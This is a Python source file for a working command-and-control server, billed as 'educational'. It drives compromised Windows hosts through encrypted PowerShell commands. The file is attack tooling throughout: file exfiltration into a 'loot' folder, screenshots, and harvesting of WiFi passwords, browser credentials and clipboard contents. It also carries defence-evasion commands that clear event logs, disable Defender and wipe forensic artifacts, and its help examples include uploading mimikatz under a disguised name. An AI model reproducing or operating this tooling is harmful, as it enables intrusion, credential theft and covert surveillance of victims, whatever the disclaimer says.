#!/usr/bin/env python3
"""
Enhanced Educational C2 Server
Features: AES Encryption, Multi-server, Advanced commands
For authorized penetration testing and educational purposes only
"""

import socket
import threading
import os
import base64
import time
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

class EnhancedC2Server:
    def __init__(self, host='0.0.0.0', port=4444, aes_key="MySecretKey12345"):
        self.host = host
        self.port = port
        self.aes_key = aes_key.ljust(32)[:32].encode('utf-8')  # Ensure 32 bytes
        self.clients = {}
        self.client_counter = 0
        self.lock = threading.Lock()
        
        # Create directories
        os.makedirs('loot/files', exist_ok=True)
        os.makedirs('loot/screenshots', exist_ok=True)
        os.makedirs('loot/keylogs', exist_ok=True)
        os.makedirs('loot/credentials', exist_ok=True)
        
    def encrypt(self, plaintext):
        """Encrypt data with AES-256-CBC"""
        cipher = AES.new(self.aes_key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(plaintext.encode('utf-8'), AES.block_size))
        iv = cipher.iv
        return base64.b64encode(iv + ct_bytes).decode('utf-8')
    
    def decrypt(self, encrypted_text):
        """Decrypt data with AES-256-CBC"""
        try:
            encrypted_bytes = base64.b64decode(encrypted_text)
            iv = encrypted_bytes[:16]
            ct = encrypted_bytes[16:]
            cipher = AES.new(self.aes_key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode('utf-8')
        except Exception as e:
            return None
    
    def start(self):
        """Start the C2 server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(10)
        
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║       ENHANCED EDUCATIONAL C2 SERVER v2.0                 ║
║       Features: Encryption, Anti-Detection, Advanced      ║
║       For Authorized Testing Only                         ║
╚═══════════════════════════════════════════════════════════╝
[+] Server started on {self.host}:{self.port}
[+] AES-256 Encryption: ENABLED
[+] Waiting for connections...
[+] Press Ctrl+C to stop
""")
        
        try:
            while True:
                client_socket, address = server.accept()
                self.client_counter += 1
                client_id = self.client_counter
                
                with self.lock:
                    self.clients[client_id] = {
                        'socket': client_socket,
                        'address': address,
                        'info': {},
                        'active': True
                    }
                
                print(f"\n[+] Encrypted connection from {address[0]}:{address[1]} (Client #{client_id})")
                
                handler = threading.Thread(target=self.handle_client, args=(client_id,))
                handler.daemon = True
                handler.start()
                
        except KeyboardInterrupt:
            print("\n[!] Server shutting down...")
            server.close()
    
    def handle_client(self, client_id):
        """Handle individual encrypted client connection"""
        client = self.clients[client_id]
        sock = client['socket']
        
        try:
            # Read encrypted banner
            sock.settimeout(10)
            encrypted_banner = sock.recv(4096).decode('utf-8', errors='ignore')
            banner = self.decrypt(encrypted_banner)
            
            if banner:
                print(f"\n[Client #{client_id}] Decrypted Banner:\n{banner}")
                # Parse banner info
                for line in banner.split('\n'):
                    if 'Host:' in line:
                        client['info']['hostname'] = line.split('Host:')[1].strip()
                    elif 'User:' in line:
                        client['info']['user'] = line.split('User:')[1].strip()
                    elif 'OS:' in line:
                        client['info']['os'] = line.split('OS:')[1].strip()
                    elif 'Domain:' in line:
                        client['info']['domain'] = line.split('Domain:')[1].strip()
                    elif 'Admin:' in line:
                        client['info']['admin'] = line.split('Admin:')[1].strip()
            
            # Start interactive shell
            shell_thread = threading.Thread(target=self.interactive_shell, args=(client_id,))
            shell_thread.daemon = True
            shell_thread.start()
            
            while client['active']:
                time.sleep(1)
                
        except Exception as e:
            print(f"[!] Error handling client #{client_id}: {e}")
        finally:
            self.disconnect_client(client_id)
    
    def interactive_shell(self, client_id):
        """Interactive encrypted shell for client"""
        client = self.clients.get(client_id)
        if not client:
            return
        
        sock = client['socket']
        
        print(f"\n[+] Interactive encrypted shell ready for Client #{client_id}")
        print(f"[+] Type 'help' for available commands")
        
        while client['active']:
            try:
                prompt = f"\nC2 [Client #{client_id}] 🔒> "
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                # Local commands
                if command == 'help':
                    self.show_help()
                    continue
                elif command == 'sessions':
                    self.list_sessions()
                    continue
                elif command.startswith('switch '):
                    target_id = int(command.split()[1])
                    if target_id in self.clients and self.clients[target_id]['active']:
                        print(f"[+] Switching to Client #{target_id}")
                        return
                    else:
                        print(f"[-] Client #{target_id} not found or inactive")
                    continue
                elif command == 'exit':
                    print("[+] Closing connection...")
                    encrypted_cmd = self.encrypt('exit')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                    client['active'] = False
                    break
                
                # Special enhanced commands
                if command == 'wifi-passwords':
                    encrypted_cmd = self.encrypt('Get-WiFiPasswords')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                elif command == 'browser-creds':
                    encrypted_cmd = self.encrypt('Get-BrowserCredentials')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                elif command == 'clipboard-start':
                    encrypted_cmd = self.encrypt('Start-ClipboardMonitor')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                elif command == 'clipboard-stop':
                    encrypted_cmd = self.encrypt('Stop-ClipboardMonitor')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                elif command == 'clipboard-dump':
                    encrypted_cmd = self.encrypt('Get-ClipboardLog')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                elif command == 'clear-logs':
                    encrypted_cmd = self.encrypt('Clear-EventLogs')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                elif command == 'disable-defender':
                    encrypted_cmd = self.encrypt('Disable-DefenderRealtime')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                elif command == 'clean-artifacts':
                    encrypted_cmd = self.encrypt('Remove-Artifacts')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                elif command == 'network-connections':
                    encrypted_cmd = self.encrypt('Get-NetworkConnections')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                elif command == 'domain-info':
                    encrypted_cmd = self.encrypt('Get-DomainInfo')
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                elif command.startswith('download '):
                    self.download_file(client_id, command.split(' ', 1)[1])
                    continue
                elif command.startswith('upload '):
                    parts = command.split(' ', 2)
                    if len(parts) >= 3:
                        self.upload_file(client_id, parts[1], parts[2])
                    else:
                        print("[-] Usage: upload <local_file> <remote_path>")
                    continue
                elif command == 'screenshot':
                    self.take_screenshot(client_id)
                    continue
                else:
                    # Send encrypted regular command
                    encrypted_cmd = self.encrypt(command)
                    sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
                
                # Wait for encrypted response
                time.sleep(0.5)
                sock.settimeout(30)
                
                # Wait for READY signal
                ready = sock.recv(5).decode('utf-8', errors='ignore')
                if ready != 'READY':
                    continue
                
                encrypted_response = sock.recv(65536).decode('utf-8', errors='ignore')
                if encrypted_response:
                    response = self.decrypt(encrypted_response)
                    if response:
                        print(response)
                    else:
                        print("[-] Failed to decrypt response")
                
            except KeyboardInterrupt:
                print("\n[!] Use 'exit' to close connection or 'switch' to change client")
                continue
            except Exception as e:
                print(f"\n[!] Error: {e}")
                client['active'] = False
                break
    
    def download_file(self, client_id, remote_path):
        """Download file from client"""
        client = self.clients.get(client_id)
        if not client:
            return
        
        sock = client['socket']
        
        print(f"[+] Downloading: {remote_path}")
        
        download_cmd = f"$b64=[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{remote_path}')); Write-Output \"FILE_START\"; Write-Output $b64; Write-Output \"FILE_END\""
        encrypted_cmd = self.encrypt(download_cmd)
        sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
        
        # Receive encrypted file data
        response = ""
        sock.settimeout(60)
        try:
            while 'FILE_END' not in response:
                chunk = sock.recv(8192).decode('utf-8', errors='ignore')
                if not chunk:
                    break
                response += chunk
            
            # Decrypt response
            decrypted = self.decrypt(response)
            if decrypted and 'FILE_START' in decrypted and 'FILE_END' in decrypted:
                start = decrypted.find('FILE_START') + len('FILE_START')
                end = decrypted.find('FILE_END')
                b64_data = decrypted[start:end].strip()
                
                file_data = base64.b64decode(b64_data)
                filename = os.path.basename(remote_path)
                save_path = f"loot/files/{client_id}_{filename}"
                
                with open(save_path, 'wb') as f:
                    f.write(file_data)
                
                print(f"[+] File saved to: {save_path} ({len(file_data)} bytes)")
            else:
                print("[-] Download failed")
        except Exception as e:
            print(f"[-] Download error: {e}")
    
    def upload_file(self, client_id, local_path, remote_path):
        """Upload file to client"""
        client = self.clients.get(client_id)
        if not client:
            return
        
        sock = client['socket']
        
        if not os.path.exists(local_path):
            print(f"[-] Local file not found: {local_path}")
            return
        
        print(f"[+] Uploading: {local_path} -> {remote_path}")
        
        with open(local_path, 'rb') as f:
            file_data = f.read()
        
        b64_data = base64.b64encode(file_data).decode('utf-8')
        
        upload_cmd = f"$b64='{b64_data}'; [System.IO.File]::WriteAllBytes('{remote_path}', [Convert]::FromBase64String($b64)); Write-Output 'Upload complete'"
        encrypted_cmd = self.encrypt(upload_cmd)
        sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
        
        time.sleep(2)
        print(f"[+] Upload sent ({len(file_data)} bytes)")
    
    def take_screenshot(self, client_id):
        """Take screenshot on client"""
        client = self.clients.get(client_id)
        if not client:
            return
        
        sock = client['socket']
        
        print("[+] Taking screenshot...")
        
        screenshot_cmd = """
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screens = [Windows.Forms.Screen]::AllScreens
$top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
$left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
$width = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum
$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
$bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
$bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
$graphics = [Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
$ms = New-Object System.IO.MemoryStream
$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
$b64 = [Convert]::ToBase64String($ms.ToArray())
Write-Output "SCREENSHOT_START"
Write-Output $b64
Write-Output "SCREENSHOT_END"
$graphics.Dispose()
$bmp.Dispose()
$ms.Dispose()
"""
        
        encrypted_cmd = self.encrypt(screenshot_cmd)
        sock.sendall((encrypted_cmd + '\n').encode('utf-8'))
        
        response = ""
        sock.settimeout(60)
        try:
            while 'SCREENSHOT_END' not in response:
                chunk = sock.recv(8192).decode('utf-8', errors='ignore')
                if not chunk:
                    break
                response += chunk
            
            decrypted = self.decrypt(response)
            if decrypted and 'SCREENSHOT_START' in decrypted and 'SCREENSHOT_END' in decrypted:
                start = decrypted.find('SCREENSHOT_START') + len('SCREENSHOT_START')
                end = decrypted.find('SCREENSHOT_END')
                b64_data = decrypted[start:end].strip()
                
                img_data = base64.b64decode(b64_data)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                save_path = f"loot/screenshots/client{client_id}_{timestamp}.png"
                
                with open(save_path, 'wb') as f:
                    f.write(img_data)
                
                print(f"[+] Screenshot saved to: {save_path} ({len(img_data)} bytes)")
            else:
                print("[-] Screenshot failed")
        except Exception as e:
            print(f"[-] Screenshot error: {e}")
    
    def list_sessions(self):
        """List all active client sessions"""
        print("\n╔═══════════════════════════════════════════════════════════╗")
        print("║                    ACTIVE SESSIONS (ENCRYPTED)            ║")
        print("╚═══════════════════════════════════════════════════════════╝")
        
        with self.lock:
            if not self.clients:
                print("[-] No active sessions")
                return
            
            for cid, client in self.clients.items():
                if client['active']:
                    info = client['info']
                    print(f"\n[Client #{cid}] 🔒")
                    print(f"  Address: {client['address'][0]}:{client['address'][1]}")
                    print(f"  Hostname: {info.get('hostname', 'N/A')}")
                    print(f"  User: {info.get('user', 'N/A')}")
                    print(f"  Domain: {info.get('domain', 'N/A')}")
                    print(f"  Admin: {info.get('admin', 'N/A')}")
                    print(f"  OS: {info.get('os', 'N/A')}")
    
    def show_help(self):
        """Show help menu"""
        help_text = """
╔═══════════════════════════════════════════════════════════╗
║              ENHANCED C2 COMMANDS                          ║
╚═══════════════════════════════════════════════════════════╝

SESSION MANAGEMENT:
  sessions                    - List all active sessions
  switch <id>                 - Switch to another client
  exit                        - Close current client connection

FILE OPERATIONS:
  download <remote_path>      - Download file from client
  upload <local> <remote>     - Upload file to client
  screenshot                  - Take screenshot

CREDENTIAL HARVESTING:
  wifi-passwords              - Extract saved WiFi passwords
  browser-creds               - Find browser credential databases
  clipboard-start             - Start clipboard monitoring
  clipboard-stop              - Stop clipboard monitoring
  clipboard-dump              - Dump captured clipboard data

INFORMATION GATHERING:
  network-connections         - Show active network connections
  domain-info                 - Get domain/DC information
  Get-Process                 - List running processes
  Get-LocalUser               - List local users
  Get-LocalGroupMember Administrators - List admins

DEFENSE EVASION:
  clear-logs                  - Clear Windows event logs
  disable-defender            - Disable Defender real-time
  clean-artifacts             - Remove forensic artifacts

STANDARD POWERSHELL:
  Any PowerShell command works - Full shell access
  
EXAMPLES:
  download C:\\Users\\victim\\Documents\\passwords.txt
  upload mimikatz.exe C:\\Windows\\Temp\\sys32.exe
  wifi-passwords
  Get-NetTCPConnection -State Established
"""
        print(help_text)
    
    def disconnect_client(self, client_id):
        """Disconnect client"""
        with self.lock:
            if client_id in self.clients:
                try:
                    self.clients[client_id]['socket'].close()
                except:
                    pass
                self.clients[client_id]['active'] = False
                print(f"\n[!] Client #{client_id} disconnected")

if __name__ == "__main__":
    import sys
    
    print("""
╔═══════════════════════════════════════════════════════════╗
║      ENHANCED EDUCATIONAL C2 SERVER v2.0                   ║
║      Features: AES-256 Encryption, Anti-Detection          ║
║      For Authorized Testing Only                           ║
╚═══════════════════════════════════════════════════════════╝

REQUIREMENTS:
  pip3 install pycryptodome

USAGE:
  python3 enhanced_c2.py [port] [host] [aes_key]
  
  Default: python3 enhanced_c2.py 4444 0.0.0.0 MySecretKey12345
    """)
    
    # Parse arguments
    host = '0.0.0.0'
    port = 4444
    aes_key = "MySecretKey12345"
    
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    if len(sys.argv) > 2:
        host = sys.argv[2]
    if len(sys.argv) > 3:
        aes_key = sys.argv[3]
    
    print(f"\n[!] IMPORTANT: Make sure client uses same AES key: {aes_key}\n")
    
    server = EnhancedC2Server(host, port, aes_key)
    server.start()
